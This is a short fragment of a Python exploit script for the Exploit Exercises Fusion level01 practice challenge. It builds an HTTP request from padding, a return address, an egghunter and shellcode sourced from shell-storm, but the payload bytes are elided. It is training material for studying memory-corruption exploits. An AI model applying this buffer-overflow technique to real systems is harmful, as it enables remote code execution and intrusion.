# exploit-exercises - fusion - level01 using egghunter
# exploit by @vnico
...
# http://www.shell-storm.org/shellcode/files/shellcode-839.php
EGGHUNTER = (
...
REQUEST = 'GET {0}{1}{2} HTTP/1.1{3}{4}'.format(PADDING, RET_ADDRESS, EGGHUNTER, EGG, SHELLCODE)
